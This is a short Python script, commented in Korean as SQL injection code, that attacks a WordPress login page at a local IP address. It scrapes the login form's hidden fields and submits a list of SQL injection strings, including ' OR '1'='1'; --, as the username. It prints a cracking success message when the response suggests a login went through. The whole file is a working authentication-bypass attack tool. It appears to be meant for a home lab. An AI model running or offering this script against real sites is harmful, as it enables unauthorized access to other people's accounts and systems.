#SQL 주입 코드

from urllib.request import build_opener, HTTPCookieProcessor
import http.cookiejar as cookielib
from html.parser import HTMLParser
from urllib.parse import urlencode

sqlcodes = ['\'', '--', '/*', '"', '\' OR \'1\' = \'1\'; -- ']

targeturl = 'http://192.168.0.14/blog/wp-login.php'
targetpost = 'http://192.168.0.14/blog/wp-login.php'

username_field = 'log'
pass_field = 'pwd'
check = 'update'

class myHTMLParser(HTMLParser):
	def __init__(self):
		HTMLParser.__init__(self)
		self.tagResult = {}
		
	def handle_starttag(self, tag, attrs):
		if tag == 'input':
			tagname = None
			tagvalue = None
			for name, value in attrs:
				if name == 'name':
					tagname = value
				if name == 'value':
					tagvalue = value
					
			if tagname is not None:
				self.tagResult[tagname] = tagvalue		


def webAuthCracker(username):
	password = ''
	cookies = cookielib.FileCookieJar('cookies')
	opener = build_opener(HTTPCookieProcessor(cookies))
	res = opener.open(targeturl)
	htmlpage = res.read().decode()
	
	print('+++TRYING %s: %s' %(username, password))
	
	parseR = myHTMLParser()
	parseR.feed(htmlpage)		
	
	inputtags = parseR.tagResult
	inputtags[username_field] = username
	inputtags[pass_field] = password
	
	loginData = urlencode(inputtags).encode('utf-8')
	loginRes = opener.open(targetpost, data=loginData)
	loginResult = loginRes.read().decode()
	
	if check in loginResult:
		print('---CRACKING SUCCESS!')
		print('---SQL INJECTION [%s]' %username)				
		

def main():
	print('+++SQL INJECTION START..')
	for sqlcode in sqlcodes:
		print('>>>INJECT SQL [%s]' %sqlcode) 
		webAuthCracker(sqlcode)	
	
if __name__ == '__main__':
	main()
